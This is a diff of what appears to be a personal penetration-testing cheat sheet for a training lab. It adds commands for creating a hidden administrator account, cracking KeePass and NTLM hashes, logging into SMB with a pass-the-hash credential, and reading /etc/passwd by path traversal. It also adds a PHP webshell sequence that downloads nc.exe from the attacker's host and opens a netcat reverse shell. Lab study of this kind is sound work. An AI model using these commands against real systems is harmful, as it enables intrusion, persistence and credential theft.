@@ -382,6 +382,8 @@ find / -name *.kdbx 2>/dev/null
 
 ### GitHub recon
 
+#see RELIA LEGACY for detailed notes
+
 - You need to find traces of the `.git` files on the target machine.
 - Now navigate to the directory where the file is located, a potential repository.
 - Commands
@@ -465,6 +467,7 @@ win> copy file \\KaliIP\sharename
 ### Windows
 
 ```powershell
+#If having issues go back to RELIA WEB02 notes and follow steps
 net user hacker hacker123 /add
 net localgroup Administrators hacker /add
 net localgroup "Remote Desktop Users" hacker /ADD
@@ -516,7 +519,7 @@ hashcat -m <number> hash wordlists.txt --force
 #run with rule list (NTLM)
 hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 
-#keypass
+#keypass (to interact with keypass see RELIA External notes)
 hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 
 #Kerberoast
@@ -812,6 +815,7 @@ smbclient -L //IP #or try with 4 /'s
 smbclient //server/share
 smbclient //server/share -U <username>
 smbclient //server/share -U domain/username
+smbclient //192.168.230.248/transfer -U relia.com/zachary%54abdf854d8c0653b1be3458454e4a3b #login with hash see RELIA EXTERNAL notes.
 
 #SMBmap
 smbmap -H <target_ip>
@@ -844,9 +848,11 @@ mget *
 ```powershell
 #USE THE FOLLOWING WORDLISTS
 directory-list-2.3-medium.txt
-raft-large-directories-lowercase.txt
-raft-medium-directories-lowercase.txt
-common.txt
+/usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
+/usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+/usr/share/seclists/Discovery/Web-Content/common.txt
+/usr/share/wordlists/dirb/big.txt
+/usr/share/wordlists/wfuzz/general/megabeast.txt
 
 dirbuster
 gobuster dir -u http://example.com -w /path/to/wordlist.txt
@@ -1068,6 +1074,19 @@ http://192.168.221.193:3000/public/plugins/alertlist/../../../../../../../../Use
 ```powershell
 #Sometimes it doesn't show if we try path, then we need to encode them
 curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+```
+
+- PHP webshell
+
+```powershell
+#See Relia Legacy for detailed notes
+
+#after our simple php command shell if uploaded we can run the following commands
+(kali㉿kali)-[~/Desktop/Windows Privesc]$ python3 -m http.server #start http server
+http://192.168.236.249:8000/cms/media/simple-backdoor.pHP?cmd=certutil.exe -urlcache -split -f "http://<YOUR_KALI_IP>/nc.exe" nc.exe #upload nc
+nc -lnvp 4444 #start netcat listener
+http://192.168.236.249:8000/cms/media/simple-backdoor.pHP?cmd=nc.exe -nv <YOUR_KALI_IP> 4444 -e cmd #run netcat command
+ 
 ```
 
 - Wordpress
